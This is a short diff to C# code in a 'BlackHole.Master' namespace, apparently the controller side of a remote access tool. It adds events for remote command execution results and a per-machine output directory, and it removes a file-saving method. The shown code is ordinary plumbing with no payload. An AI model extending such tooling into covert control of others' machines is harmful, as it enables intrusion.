@@ -18,6 +18,10 @@ namespace BlackHole.Master
         CONNECTED,
         DISCONNECTED,
         INCOMMING_MESSAGE,
+        COMMAND_EXECUTED,
+        COMMAND_CONTINUE,
+        COMMAND_FAULTED,
+        COMMAND_COMPLETED,
         FILE_DOWNLOADED,
         FILE_UPLOADED,
     }
@@ -111,6 +115,11 @@ namespace BlackHole.Master
             get;
             set;
         }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        public string OutputDirectory => MachineName;
         
         /// <summary>
         /// 
@@ -164,16 +173,6 @@ namespace BlackHole.Master
         public void DecrementPingTimeout()
         {
             PingTimeout--;
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="name"></param>
-        /// <param name="rawFile"></param>
-        public void SaveDownloadedFile(string name, byte[] rawFile)
-        {
-            FileHelper.SaveDownloadedFile(MachineName, name, rawFile);
         }
 
         /// <summary>
